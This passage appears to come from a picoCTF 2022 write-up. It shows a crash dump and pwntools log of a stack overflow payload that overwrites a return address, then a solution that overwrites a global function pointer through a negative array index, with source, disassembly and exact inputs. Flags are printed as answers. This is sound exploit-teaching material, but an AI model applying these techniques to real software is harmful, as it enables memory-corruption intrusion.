CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063\n EIP:00401602 ESP:0064fe80 EBP:00401530 EFLAGS:00010203(  R- --  I   - - -C)\n EAX:0064fdf0 EBX:00230e78 ECX:0064fde0 EDX:7fec48d8\n ESI:00000005 EDI:00111848\nStack dump:\n0x0064fe80:  7fec39e0 00000000 00000004 00000000\n0x0064fe90:  7b432ecc 00230e78 0064ff28 00401386\n0x0064fea0:  00000002 00230e70 0021d2d8 7bcc4625\n0x0064feb0:  00000004 00000008 00230e70 00111848\n0x0064fec0:  000bd327 131f8c12 00000000 00000000\n0x0064fed0:  00000000 00000000 00000000 00000000\nBacktrace:\n=>0 0x00401602 in vuln (+0x1602) (0x00401530)\n  1 0x44c768ec (0x83e58955)\n0x00401602: addb\t%cl,0x71e82404(%ecx)\nModules:\nModule\tAddress\t\t\tDebug info\tName (5 modules)\nPE\t  400000-  44b000\tDwarf           vuln\nPE\t7b020000-7b023000\tDeferred        kernelbase\nPE\t7b420000-7b5db000\tDeferred        kernel32\nPE\t7bc30000-7bc34000\tDeferred        ntdll\nPE\t7fe10000-7fe14000\tDeferred        msvcrt\nThreads:\nprocess  tid      prio (all id:s are in hex)\n00000008 (D) Z:\\challenge\\vuln.exe\n\t00000009    0 <==\n0000000c services.exe\n\t00000020  
  0\n\t0000001d    0\n\t0000000e    0\n\t0000000d    0\n00000011 explorer.exe\n\t00000012    0\n0000001e winedevice.exe\n\t00000022    0\n\t00000021    0\n\t0000001f    0\nSystem information:\n    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)\n    Platform: i386\n    Version: 
Windows 7\n    Host system: Linux\n    Host version: 5.13.0-1017-aws\n'
```

So I added 4 more bytes to the filler and got the flag.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ python3 wine.py 
[+] Opening connection to saturn.picoctf.net on port 62481: Done
[DEBUG] Received 0x13 bytes:
    b'Give me a string!\r\n'
b'Give me a string!\r\n'
[DEBUG] Sent 0x91 bytes:
    00000000  1b 1b 1b 1b  1b 1b 1b 1b  1b 1b 1b 1b  1b 1b 1b 1b  │····│····│····│····│
    *
    00000080  1b 1b 1b 1b  1b 1b 1b 1b  1b 1b 1b 1b  30 15 40 00  │····│····│····│0·@·│
    00000090  0a                                                  │·│
    00000091
[▅] Receiving all data: 35B
[DEBUG] Received 0x23 bytes:
    b'picoCTF{Un_v3rr3_d3_v1n_25f25e91}\r\n'
[DEBUG] Received 0x5ce bytes:
    b'Unhandled exception: page fault on read access to 0x7fec3900 in 32-bit code (0x7fec3900).\n'
    b'Register dump:\n'
    b' CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063\n'
    b' EIP:7fec3900 ESP:0064fe84 EBP:1b1b1b1b EFLAGS:00010206(  R- --  I   - -P- )\n'
    b' EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4\n'
    b' ESI:00000005 EDI:006d2250\n'
    b'Stack dump:\n'
    b'0x0064fe84:  00000000 00000004 00000000 7b432ecc\n'
    b'0x0064fe94:  00230e78 0064ff28 00401386 00000002\n'
    b'0x0064fea4:  00230e70 0021d220 7bcc4625 00000004\n'
    b'0x0064feb4:  00000008 00230e70 006d2250 000bd5b2\n'
    b'0x0064fec4:  02a03de6 00000000 00000000 00000000\n'
    b'0x0064fed4:  00000000 00000000 00000000 00000000\n'
    b'Backtrace:\n'
    b'=>0 0x7fec3900 (0x1b1b1b1b)\n'
    b'0x7fec3900: addb\t%al,0x0(%eax)\n'
    b'Modules:\n'
    b'Module\tAddress\t\t\tDebug info\tName (5 modules)\n'
    b'PE\t  400000-  44b000\tDeferred        vuln\n'
    b'PE\t7b020000-7b023000\tDeferred        kernelbase\n'
    b'PE\t7b420000-7b5db000\tDeferred        kernel32\n'
    b'PE\t7bc30000-7bc34000\tDeferred        ntdll\n'
    b'PE\t7fe10000-7fe14000\tDeferred        msvcrt\n'
    b'Threads:\n'
    b'process  tid      prio (all id:s are in hex)\n'
    b'00000008 (D) Z:\\challenge\\vuln.exe\n'
    b'\t00000009    0 <==\n'
    b'0000000e services.exe\n'
    b'\t00000026    0\n'
    b'\t00000025    0\n'
    b'\t00000024    0\n'
    b'\t00000015    0\n'
    b'\t00000010    0\n'
    b'\t0000000f    0\n'
    b'00000011 plugplay.exe\n'
    b'\t00000019    0\n'
    b'\t00000018    0\n'
    b'\t00000012    0\n'
    b'00000022 winedevice.exe\n'
    b'\t00000028    0\n'
    b'\t00000027    0\n'
    b'\t00000023    0\n'
    b'System information:\n'
    b'    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)\n'
    b'    Platform: i386\n'
    b'    Version: Windows 7\n'
    b'    Host system: Linux\n'
    b'    Host version: 5.13.0-1017-aws\n'
[*] Closed connection to saturn.picoctf.net port 62481
```

**Flag: `picoCTF{Un_v3rr3_d3_v1n_25f25e91}`**

## function overwrite (400 pts)

> Story telling class 2/2
>
> You can point to all kinds of things in C. Checkout our function pointers demo [program](sources/function-overwrite/vuln). You can view source [here](sources/function-overwrite/vuln.c). And connect with it using `nc saturn.picoctf.net 63778`

The program asks a few question and returns its verdict.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ nc saturn.picoctf.net 63778
Tell me a story and then I'll tell you if you're a 1337 >> LLLLLLLLLLL
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
23
2
You've failed this class.
^C
```

Below are some of the lines from the source code. In order to obtain the flag, the user should get the correct score by providing a `story` whose ASCII numbers amount to 13371337, which is impossible due to the maximum length of the story being too small. The most likely goal here is to avoid `hard_checker` and get to `easy_checker`.

```cpp

#define BUFSIZE 64
#define FLAGSIZE 64

// Score = Sum of ASCII Decimal for each letter

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

// Easy: 1337 points
void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

// Hard: 13371337 points
void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    /* Same as easy_checker, except required score being 13371337 */
  }
}

// check goes to hard_checker
void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

// Story cannot be longer than 128 letters
void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```

I noticed that, along with `check` function pointer, a global variable `fun` is declared and used to add the second number input to the value in the area with the index that is the first number input. I thought that this is the variable for abuse.

```text
080492fc <easy_checker>:
...
08049436 <hard_checker>:
...
08049570 <vuln>:
 8049570:	f3 0f 1e fb          	endbr32 
 ...
 8049599:	83 c4 10             	add    $0x10,%esp
 804959c:	83 ec 08             	sub    $0x8,%esp
 804959f:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
 80495a5:	50                   	push   %eax
 80495a6:	8d 83 fc e0 ff ff    	lea    -0x1f04(%ebx),%eax
 80495ac:	50                   	push   %eax
 80495ad:	e8 ce fb ff ff       	call   8049180 <__isoc99_scanf@plt>
 80495b2:	83 c4 10             	add    $0x10,%esp
 80495b5:	83 ec 0c             	sub    $0xc,%esp
 80495b8:	8d 83 04 e1 ff ff    	lea    -0x1efc(%ebx),%eax
 80495be:	50                   	push   %eax
 80495bf:	e8 5c fb ff ff       	call   8049120 <puts@plt>
 80495c4:	83 c4 10             	add    $0x10,%esp
 80495c7:	83 ec 04             	sub    $0x4,%esp
 80495ca:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
 80495d0:	50                   	push   %eax
 80495d1:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
 80495d7:	50                   	push   %eax
 80495d8:	8d 83 57 e1 ff ff    	lea    -0x1ea9(%ebx),%eax
 80495de:	50                   	push   %eax
 80495df:	e8 9c fb ff ff       	call   8049180 <__isoc99_scanf@plt>
 80495e4:	83 c4 10             	add    $0x10,%esp
 80495e7:	8b 85 74 ff ff ff    	mov    -0x8c(%ebp),%eax
 
 ; check if num1 < 10; if not, jump
 80495ed:	83 f8 09             	cmp    $0x9,%eax
 80495f0:	7f 22                	jg     8049614 <vuln+0xa4>

 ; if num1 < 10:
 80495f2:	8b 85 74 ff ff ff    	mov    -0x8c(%ebp),%eax
 80495f8:	8b 8c 83 80 00 00 00 	mov    0x80(%ebx,%eax,4),%ecx
 80495ff:	8b 95 70 ff ff ff    	mov    -0x90(%ebp),%edx
 8049605:	8b 85 74 ff ff ff    	mov    -0x8c(%ebp),%eax
 804960b:	01 ca                	add    %ecx,%edx
 804960d:	89 94 83 80 00 00 00 	mov    %edx,0x80(%ebx,%eax,4)

 ; jump here if num1 >= 10:
 8049614:	8b b3 40 00 00 00    	mov    0x40(%ebx),%esi
 804961a:	83 ec 0c             	sub    $0xc,%esp
 804961d:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
 8049623:	50                   	push   %eax
 8049624:	e8 17 fb ff ff       	call   8049140 <strlen@plt>
 8049629:	83 c4 10             	add    $0x10,%esp
 804962c:	83 ec 08             	sub    $0x8,%esp
 804962f:	50                   	push   %eax
 8049630:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
 8049636:	50                   	push   %eax
 8049637:	ff d6                	call   *%esi ;; check(story, strlen(story))

 8049639:	83 c4 10             	add    $0x10,%esp
 804963c:	90                   	nop
 804963d:	8d 65 f8             	lea    -0x8(%ebp),%esp
 8049640:	5b                   	pop    %ebx
 8049641:	5e                   	pop    %esi
 8049642:	5d                   	pop    %ebp
 8049643:	c3                   	ret    

```

Since `check` and `fun` are both global variables, their addresses are constant.

```
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
... 
0x0804c040  check
0x0804c044  __TMC_END__
0x0804c044  __bss_start
0x0804c044  _edata
0x0804c060  completed
0x0804c080  fun
```

Since `check` and `fun` are `0x40` bytes away, and each item in the `int` array takes 4 bytes, the index should be `-0x10`, which is `-16` in decimal. The second number should be the difference of addresses between `easy_checker()` and `hard_checker()`.


|Item   |  Value                                      |
|-------|---------------------------------------------|
|`story`|**"abcdefghijklk"** (amounts to 1337 points) |
|`num1` | **-16** |
|`num2` |`0x080492fc` - `0x08049436` = **-314**       |

``` text
COMPUTER:/mnt/d/GitHub/picoCTF2022$ nc saturn.picoctf.net 63778
Tell me a story and then I'll tell you if you're a 1337 >> abcdefghijklk
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
-16
-314
You're 1337. Here's the flag.
picoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}
```

**Flag: `picoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}`**
